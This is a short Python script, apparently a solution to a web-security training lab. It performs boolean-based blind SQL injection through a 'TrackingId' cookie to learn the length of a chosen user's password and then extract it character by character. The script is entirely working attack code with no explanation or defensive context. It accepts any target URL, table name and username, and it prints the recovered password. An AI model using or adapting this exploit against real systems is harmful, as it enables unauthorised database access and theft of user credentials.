import requests
import string
from urllib.parse import quote




url= input("URL TARGET:   ")
tracking_id= input("TrackingId:   ")
session= input("Session Cookie: ")
table= input("Users table name:    ")
user= input("Username target:    ")
column_password= input("Name of column password:    ")

length=1
while True:
    payload = f"' AND (SELECT LENGTH({column_password}) FROM {table} WHERE username='{user}')>'{length}"
    cookies = {"TrackingId": tracking_id + payload, "session": session}
    response = requests.get(url, cookies=cookies)
    
    if "Welcome back!" in response.text:
        length += 1
    else:
        break



characters = string.printable


password=""
for position in range(1, length + 1):
    for char in characters:
        payload_final= f"' AND (SELECT SUBSTRING({column_password},{position},1) FROM {table} WHERE username='{user}')='{char}"
        cookies= {"TrackingId": tracking_id + quote(payload_final), "session": session}
        response = requests.get(url, cookies=cookies)
        print(f"Testing: {char}  - Welcome back {'Welcome back!' in response.text}")
        if "Welcome back!" in response.text:
            password += char
            break
        else:
            pass

print(f"Password length: {length}")
print(f"Password: {password}")


